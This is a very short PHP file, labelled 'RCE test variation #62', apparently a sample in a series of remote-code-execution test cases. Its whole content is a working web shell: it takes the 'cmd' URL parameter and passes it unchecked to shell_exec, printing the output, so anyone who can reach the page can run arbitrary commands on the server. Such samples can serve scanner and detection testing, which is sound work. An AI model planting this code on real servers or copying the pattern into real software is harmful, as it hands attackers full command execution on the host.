<?php
// RCE test variation #62
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>